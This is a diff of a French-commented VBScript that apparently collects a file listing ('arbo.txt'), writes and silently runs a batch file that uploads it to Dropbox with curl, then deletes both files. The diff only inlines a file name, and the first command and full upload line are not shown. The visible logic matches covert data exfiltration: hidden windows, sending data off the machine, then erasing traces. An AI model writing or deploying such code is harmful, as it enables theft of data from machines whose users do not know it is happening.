@@ -13,9 +13,6 @@ objShell.Run cmd, 0, True
 WScript.Sleep 5000
 
 ' Créer le fichier batch "send_to_dropbox.bat"
-Dim batFile
-batFile = "send_to_dropbox.bat"
-
 Dim batContent
 batContent = "@echo off" & vbCrLf & _
              "setlocal enabledelayedexpansion" & vbCrLf & vbCrLf & _
@@ -29,7 +26,7 @@ batContent = "@echo off" & vbCrLf & _
              "--data-binary @""arbo.txt"""
 
 ' Écrire le contenu dans le fichier batch
-Set batStream = fso.CreateTextFile(batFile, True)
+Set batStream = fso.CreateTextFile("send_to_dropbox.bat", True)
 batStream.WriteLine batContent
 batStream.Close
 Set batStream = Nothing
@@ -38,13 +35,13 @@ Set batStream = Nothing
 WScript.Sleep 5000
 
 ' Appeler le fichier batch pour envoyer le fichier à Dropbox
-objShell.Run batFile, 0, True
+objShell.Run "send_to_dropbox.bat", 0, True
 
 ' Attendre que le fichier batch ait fini son exécution avant de supprimer
 WScript.Sleep 2000 ' Attendre 2 secondes pour être sûr que le batch est terminé
 
 ' Supprimer le fichier batch
-fso.DeleteFile batFile
+fso.DeleteFile "send_to_dropbox.bat"
 
 ' Supprimer le fichier arbo.txt
 fso.DeleteFile "arbo.txt"
